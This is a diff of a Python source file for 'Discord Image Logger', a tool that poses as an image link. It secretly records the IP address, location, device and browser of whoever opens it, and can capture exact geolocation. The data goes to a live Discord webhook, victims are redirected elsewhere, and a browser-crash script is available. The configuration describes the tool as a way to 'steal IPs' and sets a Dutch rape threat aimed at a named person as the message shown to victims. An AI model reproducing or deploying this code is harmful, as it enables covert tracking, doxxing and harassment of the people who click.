@@ -1,373 +1,255 @@
-"""
-Discord Image Logger
-A tool for logging IP addresses and system information via Discord's Open Original feature.
-Author: DeKrypt | https://github.com/dekrypted
-Version: v2.0
-"""
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
 
-import base64
-import traceback
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-from typing import Optional, Dict, Any, Tuple
+import traceback, requests, base64, httpagentparser
 
-import requests
-import httpagentparser
-
-# Application Metadata
 __app__ = "Discord Image Logger"
-__description__ = "Logs IP addresses and system information via Discord Open Original feature"
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
-# Configuration
-CONFIG = {
-    # Webhook Configuration
+config = {
+    # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1519697878333915258/7lk-7Jj6tgxGbrvykLVk4eAd9sk9LXrWA88d6uURY2UjgOrYKe-2s3mDMlj0pN4nxj_4",
-    "username": "Image Logger",
-    "color": 0x00FFFF,
-    
-    # Image Settings
     "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
     "imageArgument": True,
-    "buggedImage": True,
-    
-    # Message Settings
+    "username": "Image Logger",
+    "color": 0x00FFFF,
+    "crashBrowser": False,
+    "accurateLocation": False,
     "message": {
         "doMessage": True,
-        "message": "Your IP has been logged",
+        "message": "Alex Gaat je verkrachten",
         "richMessage": True,
     },
-    
-    # Privacy & Detection
-    "vpnCheck": 1,  # 0=off, 1=ping only, 2=block
-    "antiBot": 1,   # 0=off, 1=ping, 2=ping if hosting, 3=block hosting, 4=block hosting except proxies
-    "accurateLocation": False,
+    "vpnCheck": 1,
     "linkAlerts": True,
-    "crashBrowser": False,
-    
-    # Redirect Settings
+    "buggedImage": True,
+    "antiBot": 1,
     "redirect": {
         "redirect": True,
-        "page": "https://example.com"
+        "page": "https://insted.pro?video=7901016247"
     },
 }
 
-# Blocked IP prefixes
-BLACKLISTED_IPS = ("27", "104", "143", "164")
+blacklistedIPs = ("27", "104", "143", "164")
 
-# Binary data for bugged image response
-BINARIES = {
-    "loading": base64.b85decode(
-        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
-    )
-}
-
-
-def is_bot(ip: str, useragent: str) -> Optional[str]:
-    """
-    Check if the request is from a known bot service.
-    
-    Args:
-        ip: The requester's IP address
-        useragent: The requester's User-Agent string
-        
-    Returns:
-        String identifying the bot service, or False if not a bot
-    """
+def botCheck(ip, useragent):
     if ip and ip.startswith(("34", "35")):
         return "Discord"
     elif useragent and useragent.startswith("TelegramBot"):
         return "Telegram"
-    return False
+    else:
+        return False
 
+def reportError(error):
+    requests.post(config["webhook"], json={
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [{
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }],
+    })
 
-def get_location_info(ip: str) -> Dict[str, Any]:
-    """
-    Fetch geolocation and network information for an IP address.
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+    if ip and ip.startswith(blacklistedIPs):
+        return
     
-    Args:
-        ip: The IP address to lookup
-        
-    Returns:
-        Dictionary containing location and network information
-    """
-    try:
-        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
-        return response.json()
-    except requests.RequestException:
-        return {}
-
-
-def format_embed_data(ip: str, useragent: str, location: Dict[str, Any], 
-                      endpoint: str, url: Optional[str] = None) -> Dict[str, Any]:
-    """
-    Format the Discord embed data for the IP log report.
+    bot = botCheck(ip, useragent)
     
-    Args:
-        ip: The logged IP address
-        useragent: The requester's User-Agent
-        location: Location information dictionary
-        endpoint: The endpoint that was accessed
-        url: Optional image URL for thumbnail
-        
-    Returns:
-        Formatted Discord webhook data
-    """
-    os_name, browser = ("Unknown", "Unknown")
-    if useragent:
-        os_name, browser = httpagentparser.simple_detect(useragent)
+    if bot:
+        if config["linkAlerts"]:
+            requests.post(config["webhook"], json={
+                "username": config["username"],
+                "content": "",
+                "embeds": [{
+                    "title": "Image Logger - Link Sent",
+                    "color": config["color"],
+                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                }],
+            })
+        return
+
+    ping = "@everyone"
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     
-    embed_data = {
-        "username": CONFIG["username"],
-        "content": "",
+    if info["proxy"]:
+        if config["vpnCheck"] == 2:
+            return
+        if config["vpnCheck"] == 1:
+            ping = ""
+    
+    if info["hosting"]:
+        if config["antiBot"] == 4:
+            if not info["proxy"]:
+                return
+        if config["antiBot"] == 3:
+            return
+        if config["antiBot"] == 2:
+            if not info["proxy"]:
+                ping = ""
+        if config["antiBot"] == 1:
+            ping = ""
+
+    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
+    
+    embed = {
+        "username": config["username"],
+        "content": ping,
         "embeds": [{
             "title": "Image Logger - IP Logged",
-            "color": CONFIG["color"],
+            "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
-
+            
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{location.get('isp', 'Unknown')}`
-> **ASN:** `{location.get('as', 'Unknown')}`
-> **Country:** `{location.get('country', 'Unknown')}`
-> **Region:** `{location.get('regionName', 'Unknown')}`
-> **City:** `{location.get('city', 'Unknown')}`
-> **Coords:** `{location.get('lat', 'Unknown')}, {location.get('lon', 'Unknown')}`
-> **Timezone:** `{location.get('timezone', 'Unknown')}`
-> **Mobile:** `{location.get('mobile', 'Unknown')}`
-> **VPN:** `{location.get('proxy', 'Unknown')}`
-> **Bot:** `{location.get('hosting', 'Unknown')}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
 **PC Info:**
-> **OS:** `{os_name}`
+> **OS:** `{os}`
 > **Browser:** `{browser}`
 
 **User Agent:**
 {useragent}
+
 """,
-        }]
+        }],
     }
     
     if url:
-        embed_data["embeds"][0]["thumbnail"] = {"url": url}
-    
-    return embed_data
+        embed["embeds"][0]["thumbnail"] = {"url": url}
+    requests.post(config["webhook"], json=embed)
+    return info
 
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+}
 
-def send_webhook(data: Dict[str, Any], is_link_alert: bool = False) -> None:
-    """
-    Send data to the Discord webhook.
+class handler(BaseHTTPRequestHandler):
     
-    Args:
-        data: The webhook data to send
-        is_link_alert: Whether this is a link alert message
-    """
-    try:
-        if is_link_alert:
-            data["embeds"][0]["title"] = "Image Logger - Link Sent"
-            data["embeds"][0]["description"] = (
-                f"An **Image Logging** link was sent in a chat!\n"
-                f"You may receive an IP soon.\n\n"
-                f"**Endpoint:** `{data.get('endpoint', 'N/A')}`\n"
-                f"**IP:** `{data.get('ip', 'Unknown')}`\n"
-                f"**Platform:** `{data.get('platform', 'Unknown')}`"
-            )
-        
-        requests.post(CONFIG["webhook"], json=data, timeout=5)
-    except requests.RequestException as e:
-        print(f"Failed to send webhook: {e}")
-
-
-def report_error(error: str) -> None:
-    """Report an error to the Discord webhook."""
-    error_data = {
-        "username": CONFIG["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - Error",
-            "color": CONFIG["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }]
-    }
-    send_webhook(error_data)
-
-
-class ImageLoggerHandler(BaseHTTPRequestHandler):
-    """HTTP request handler for the Image Logger service."""
-    
-    def _send_response(self, status_code: int, content_type: str, data: bytes) -> None:
-        """Helper method to send an HTTP response."""
-        self.send_response(status_code)
-        self.send_header('Content-type', content_type)
-        self.end_headers()
-        self.wfile.write(data)
-    
-    def _build_image_page(self, url: str) -> bytes:
-        """Build the HTML page displaying the image."""
-        html_template = f'''<style>
-            body {{ margin: 0; padding: 0; }}
-            div.img {{
-                background-image: url('{url}');
-                background-position: center center;
-                background-repeat: no-repeat;
-                background-size: contain;
-                width: 100vw;
-                height: 100vh;
-            }}
-        </style>
-        <div class="img"></div>'''
-        return html_template.encode()
-    
-    def _build_redirect_page(self, url: str) -> bytes:
-        """Build an HTML page that redirects to the specified URL."""
-        return f'<meta http-equiv="refresh" content="0;url={url}">'.encode()
-    
-    def _build_geolocation_script(self) -> bytes:
-        """Build the JavaScript for geolocation capture."""
-        return b"""
-            <script>
-            var currenturl = window.location.href;
-            if (!currenturl.includes("g=")) {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function (coords) {
-                        var lat = coords.coords.latitude;
-                        var lng = coords.coords.longitude;
-                        var encoded = btoa(lat + "," + lng).replace(/=/g, "%3D");
-                        var separator = currenturl.includes("?") ? "&" : "?";
-                        location.replace(currenturl + separator + "g=" + encoded);
-                    });
-                }
-            }
-            </script>
-        """
-    
-    def handle_request(self):
-        """Main request handler."""
+    def handleRequest(self):
         try:
-            forwarded_for = self.headers.get('x-forwarded-for')
-            user_agent = self.headers.get('user-agent')
-            path = self.path
-            
-            # Parse query parameters
-            query_params = dict(parse.parse_qsl(parse.urlsplit(path).query))
-            
-            # Get image URL
-            if CONFIG["imageArgument"]:
-                if query_params.get("url"):
-                    image_url = base64.b64decode(query_params["url"].encode()).decode()
-                elif query_params.get("id"):
-                    image_url = base64.b64decode(query_params["id"].encode()).decode()
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                 else:
-                    image_url = CONFIG["image"]
+                    url = config["image"]
             else:
-                image_url = CONFIG["image"]
+                url = config["image"]
+
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
             
-            # Check if this is a bot request
-            bot_type = is_bot(forwarded_for, user_agent)
-            
-            # Log the request
-            endpoint = path.split("?")[0]
-            
-            # Handle bot requests
-            if bot_type:
-                self._send_response(
-                    200 if CONFIG["buggedImage"] else 302,
-                    'image/jpeg' if CONFIG["buggedImage"] else 'text/html',
-                    BINARIES["loading"] if CONFIG["buggedImage"] else self._build_redirect_page(image_url)
-                )
-                
-                # Send link alert
-                if CONFIG["linkAlerts"]:
-                    alert_data = {
-                        "endpoint": endpoint,
-                        "ip": forwarded_for,
-                        "platform": bot_type
-                    }
-                    send_webhook(alert_data, is_link_alert=True)
+            forwarded_for = self.headers.get('x-forwarded-for')
+            if forwarded_for and forwarded_for.startswith(blacklistedIPs):
                 return
             
-            # Handle regular requests
-            location_info = get_location_info(forwarded_for) if forwarded_for else {}
+            if botCheck(forwarded_for, self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
+                if config["buggedImage"]:
+                    self.wfile.write(binaries["loading"])
+                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
+                return
             
-            # Check for geolocation data
-            if query_params.get("g") and CONFIG["accurateLocation"]:
-                geo_data = base64.b64decode(query_params["g"].encode()).decode()
-                # Process geolocation data here if needed
-            
-            # Process location data
-            result = location_info
-            
-            # Build response data
-            if CONFIG["redirect"]["redirect"]:
-                response_data = self._build_redirect_page(CONFIG["redirect"]["page"])
-                content_type = 'text/html'
-            elif CONFIG["message"]["doMessage"]:
-                message = CONFIG["message"]["message"]
-                if CONFIG["message"]["richMessage"] and result:
-                    message = self._format_message_with_data(message, result, forwarded_for, user_agent)
-                
-                if CONFIG["crashBrowser"]:
-                    message += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
-                
-                response_data = message.encode()
-                content_type = 'text/html'
             else:
-                response_data = self._build_image_page(image_url)
-                content_type = 'text/html'
-            
-            # Add geolocation script if enabled
-            if CONFIG["accurateLocation"]:
-                response_data += self._build_geolocation_script()
-            
-            # Send the response
-            self._send_response(200, content_type, response_data)
-            
-            # Send the IP log to webhook
-            embed_data = format_embed_data(forwarded_for, user_agent, result, endpoint, image_url)
-            send_webhook(embed_data)
-            
-        except Exception as e:
-            error_message = traceback.format_exc()
-            self._send_response(500, 'text/html', 
-                b'500 - Internal Server Error<br>Please check the Discord webhook for error details.')
-            report_error(error_message)
-    
-    def _format_message_with_data(self, message: str, data: Dict[str, Any], 
-                                  ip: str, useragent: str) -> str:
-        """Replace placeholders in the message with actual data."""
-        replacements = {
-            "{ip}": ip or "Unknown",
-            "{isp}": data.get("isp", "Unknown"),
-            "{asn}": data.get("as", "Unknown"),
-            "{country}": data.get("country", "Unknown"),
-            "{region}": data.get("regionName", "Unknown"),
-            "{city}": data.get("city", "Unknown"),
-            "{lat}": str(data.get("lat", "Unknown")),
-            "{long}": str(data.get("lon", "Unknown")),
-            "{timezone}": data.get("timezone", "Unknown"),
-            "{mobile}": str(data.get("mobile", "Unknown")),
-            "{vpn}": str(data.get("proxy", "Unknown")),
-            "{bot}": str(data.get("hosting", "Unknown")),
-        }
-        
-        if useragent:
-            os_name, browser = httpagentparser.simple_detect(useragent)
-            replacements["{browser}"] = browser
-            replacements["{os}"] = os_name
-        
-        for key, value in replacements.items():
-            message = message.replace(key, value)
-        
-        return message
-    
-    do_GET = handle_request
-    do_POST = handle_request
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url)
+                else:
+                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
 
-if __name__ == "__main__":
-    print(f"{__app__} {__version__}")
-    print(f"Author: {__author__}")
-    print("Ready to handle requests...")
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", forwarded_for or "Unknown")
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    if self.headers.get('user-agent'):
+                        message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                        message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                
+                self.send_response(200)
+                self.send_header('Content-type', datatype)
+                self.end_headers()
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
+        
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
